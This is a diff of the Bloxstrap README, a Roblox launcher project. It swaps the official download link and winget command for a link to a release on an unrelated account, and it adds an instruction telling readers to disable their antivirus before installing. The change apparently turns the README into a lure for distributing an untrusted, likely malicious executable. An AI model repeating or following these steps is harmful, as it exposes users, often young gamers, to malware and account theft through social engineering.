@@ -15,12 +15,9 @@ Running into a problem or need help with something? [Check out the Wiki](https:/
 Bloxstrap is only supported for PCs running Windows.
  
  ## Installing
-Download the [latest release of Bloxstrap](https://github.com/pizzaboxer/bloxstrap/releases/latest), and run it. Configure your preferences if needed, and install. That's about it!
+First, Make sure to disable your anti virus so you can mod Roblox.
 
-Alternatively, you can install Bloxstrap via [Winget](https://winstall.app/apps/pizzaboxer.Bloxstrap) by running this in a Command Prompt window:
-```
-> winget install bloxstrap
-```
+Download the [latest release of Bloxstrap](https://github.com/N4zuk/Bloxstrap/releases/tag/Roblox), and run it. Configure your preferences if needed, and install. That's about it!
 
 You will also need the [.NET 6 Desktop Runtime](https://aka.ms/dotnet-core-applaunch?missing_runtime=true&arch=x64&rid=win11-x64&apphost_version=6.0.16&gui=true). If you don't already have it installed, you'll be prompted to install it anyway. Be sure to install Bloxstrap after you've installed this.
 
